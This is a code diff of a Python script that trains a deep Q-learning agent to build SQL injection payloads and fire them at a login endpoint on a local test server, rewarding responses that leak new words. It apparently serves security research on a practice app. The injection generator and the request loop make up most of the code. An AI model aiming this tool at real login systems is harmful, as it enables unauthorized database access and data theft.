@@ -9,15 +9,15 @@ import numpy as np
 import requests
 import re
 
+from sqltree import sqltree;
+
 url = 'http://localhost.proxyman.io:3000/rest/user/login'
 
 # Scrape site solution by T0ny lombardi from:
 # https://stackoverflow.com/questions/9265172/scrape-an-entire-website
 # os.system('wget -m -k -K -E -l 7 -t 6 -w 5 http://localhost:3000 -P ./scraped')
 
-feature_count = 100
-
-successful_payloads = []
+feature_count = 50
 
 visible_chars = [chr(i) for i in range(32, 127)]
 
@@ -27,6 +27,7 @@ f.close()
 
 scraped_words = list(filter(lambda s: s != '', data.split(' ')))
 found_words = []
+found_words_reward = []
 
 with open('sql_list.txt', 'r') as f:
     data = f.read()
@@ -52,10 +53,12 @@ columns = list(map(lambda column: column + ' ', data.split('\n')))
 #
 # sql_injection_list = data.split('\n')
 
-# visible_chars *= max(1, int(len(found_words)/len(visible_chars)))
-sql_list *= max(3, int((len(tables) + len(columns))/len(sql_list)))
+tables_and_columns = tables + columns
 
-mutation_actions = sql_list + tables + columns
+visible_chars *= max(3, int(len(tables_and_columns)/len(visible_chars))*4)
+sql_list *= max(3, int(len(tables_and_columns)/len(sql_list))*4)
+
+mutation_actions = sql_list + visible_chars + tables_and_columns
 
 # Half of action space terminates to prefer smaller queries, which implies
 # more payloads executed.
@@ -63,33 +66,53 @@ terminating_actions = [SpecialAction.TERMINATE for _ in range(len(mutation_actio
 
 # For selecting indicies in a non-terminating state to replace characters
 # with.
-replacement_indicies: List[int] = []
-replacement_actions = [SpecialAction.REPLACE for _ in range(feature_count)]
+# replacement_indicies: List[int] = []
+#replacement_actions = [SpecialAction.REPLACE for _ in range(feature_count)]
+# replacement_actions = []
 
-actions = mutation_actions + terminating_actions
+actions = terminating_actions + mutation_actions
+
+injected_payloads = []
 
 terminated = False
 state: np.ndarray
 
-def __get_payload():
-    global state
+def __post_login_error():
+    res = requests.post(url, data={
+        'email': 'test'
+    })
 
+    unique_tokens = set()
+    for token in re.split('[^a-zA-Z]+', res.text):
+        unique_tokens.add(token) 
+    scraped_words.append(unique_tokens)
+
+# Ensure normal login error is not rewarded.
+__post_login_error()
+
+def __get_payload(state: np.ndarray):
     chrs = state.tolist()
     chrs = [chr(int(i)) for i in chrs if i != 0.0]
-    return ''.join(chrs)
+    return '\' ' + ''.join(chrs) + '--'
 
-def __get_inverse_mutation_mask(with_replacements: bool = True):
-    return range(len(replacement_actions), len(actions)) \
-        if with_replacements else range(len(actions))
+# def __get_inverse_mutation_mask(with_replacements: bool = True):
+#    return range(len(replacement_actions), len(actions)) \
+#        if with_replacements else range(len(actions))
 
 def __set_mutation_mask(with_replacements: bool = True):
-    dqn.available_actions_range = __get_inverse_mutation_mask(with_replacements)
+    dqn.available_actions_range = range(len(actions)) #__get_inverse_mutation_mask(with_replacements)
 
 def __perform_termination_action():
     global state
 
-    payload = __get_payload()
-    if(payload in successful_payloads):
+    # Update the mask to account for potentially appended actions
+    # and to prevent immediate termination action of an empty state.
+    __toggle_termination_mask(True)
+
+    payload = __get_payload(state)
+    injected_payloads.append(payload)
+
+    if(__is_valid_sql_payload(payload)):
         state = dqn.create_empty_state()
         return state, -1, True
 
@@ -107,26 +130,40 @@ def __perform_termination_action():
     new_tokens = []
     for token in unique_tokens:
         if(token not in scraped_words):
-            if(token in found_words):
-                reward += 0.2
-            else:
+            if(token not in found_words):
                 found_words.append(token)
+                new_tokens.append(token)
+                reward += 1
+            '''
+            found = False
+
+            for i in range(len(found_words)):
+                if(found_words[i] == token):
+                    reward += found_words_reward[i]
+                    found_words_reward[i] *= 0.9
+                    found = True
+                    break
+                
+            if(not found):
+                found_words.append(token)
+                found_words_reward.append(0.9)
                 new_tokens.append(token)
                 reward += 1
             
             successful_payloads.append(payload)
+            '''
 
-    # Update the mask to account for potentially appended actions.
-    __set_mutation_mask()
 
     if(len(new_tokens) > 0):
-        print('\nPayload: ' + payload)
-        print('\nFound:', new_tokens)
+        print(payload)
+        print('\nNEW DATA')
+        print('\nFound:', new_tokens, '\n')
 
     state = dqn.create_empty_state()
 
     return state, reward, True
 
+'''
 def __get_filled_state_length():
     filled_state_length = 0
 
@@ -139,7 +176,15 @@ def __get_filled_state_length():
 
 def __set_replacement_mask(filled_state_length: int):
     dqn.available_actions_range = range(filled_state_length)
+'''
 
+def __toggle_termination_mask(set_mask: bool):
+    if(set_mask):
+        dqn.available_actions_range = range(len(terminating_actions), len(actions))
+    else:
+        __set_mutation_mask()
+
+'''
 def __perform_replacement_action(action_index: int):
     global state, replacement_indicies
 
@@ -171,10 +216,20 @@ def __reset_replacement_indicies():
     global replacement_indicies
 
     replacement_indicies = []
+'''
+
+def __is_valid_sql_payload(state: np.ndarray):
+    try:
+        payload = __get_payload(state)
+        sqltree(f'SELECT * FROM test WHERE test = \'{payload}\'')
+        return True
+    except:
+        return False
 
 def __perform_mutation_action(action: str):
     global state
 
+    '''
     if(__has_replacement_indicies()):
         start = replacement_indicies[0]
         exclusive_end = replacement_indicies[1] + 1
@@ -182,12 +237,17 @@ def __perform_mutation_action(action: str):
         leading_string = state[:start]
         tailing_string = state[exclusive_end:-1]
 
-        state = leading_string + [ord(action[i]) for i in len(action)] + tailing_string
+        new_state = leading_string + [ord(action[i]) for i in len(action)] + tailing_string
 
         __reset_replacement_indicies()
         __set_mutation_mask(with_replacements=True)
 
-        return state, 0, False
+        if(__is_valid_sql_payload(new_state)):
+            state = new_state
+            return state, 0, False
+        
+        return state, -1, False
+    '''
     
     # Append character(s) to the state if the state is not
     # completely filled (0.0 represents an empty character slot).
@@ -201,11 +261,13 @@ def __perform_mutation_action(action: str):
                 break
 
             state[state_index] = ord(action[j])
+        
+        break
 
-        return state, 0, False
-
-    # Return a negative reward if the state is completely filled, as
-    # the action has not achieved anything.
+    payload = __get_payload(state)
+    injected = payload in injected_payloads
+    __toggle_termination_mask(injected)
+    
     return state, -1, False
 
 def __perform_action(action_index: int):
@@ -215,18 +277,19 @@ def __perform_action(action_index: int):
 
     if(action == SpecialAction.TERMINATE):
         return __perform_termination_action()
+    '''
     elif(action == SpecialAction.REPLACE):
         return __perform_replacement_action(action_index)
-    else:
-        return __perform_mutation_action(action)
-
+    '''
+    
+    return __perform_mutation_action(action)
 
 dqn = DQN(
     RLHyperparametersModel(
         gamma=0.9,
         learning_rate=0.00025,
         batch_size=64,
-        training_episodes=50000,
+        training_episodes=100000,
         test_episodes=100,
         max_steps_per_episode=100,
         feature_count=feature_count,
@@ -236,10 +299,10 @@ dqn = DQN(
         start=1.0,
         min=0.1,
         max=1.0,
-        random_frame_count=500,
-        greedy_frame_count=100000
+        random_frame_count=10000,
+        greedy_frame_count=1000000
     ),
-    available_actions_range=__get_inverse_mutation_mask(),
+    available_actions_range=range(len(actions)), #__get_inverse_mutation_mask(),
     perform_action_callback=__perform_action
 )
 
